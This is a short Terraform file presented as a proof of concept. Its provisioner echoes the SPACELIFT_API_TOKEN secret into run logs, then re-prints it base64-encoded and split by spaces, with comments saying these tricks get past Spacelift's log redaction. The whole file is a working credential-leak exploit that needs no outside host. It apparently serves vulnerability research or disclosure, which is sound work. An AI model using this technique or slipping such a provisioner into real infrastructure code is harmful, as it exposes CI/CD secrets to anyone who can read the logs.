resource "null_resource" "log_redaction_bypass" {
  triggers = {
    always_run = "${timestamp()}"
  }

  provisioner "local-exec" {
    command = <<EOT
      echo "=== START PoC: Log Redaction Bypass ==="
      
      # Standard echo (Should be redacted by Spacelift)
      echo "[*] Standard Echo:"
      echo "$SPACELIFT_API_TOKEN"
      
      # Bypass Method 1: Base64 Encoding
      # The regex fails to match the Base64 representation of the secret.
      echo "[*] Exfiltration via Base64:"
      echo -n "$SPACELIFT_API_TOKEN" | base64
      
      # Bypass Method 2: String Splitting
      # Inserting spaces breaks the pattern matching.
      echo "[*] Exfiltration via Splitting:"
      echo "$SPACELIFT_API_TOKEN" | sed 's/./& /g'
      
      echo "=== END PoC ==="
    EOT
  }
}
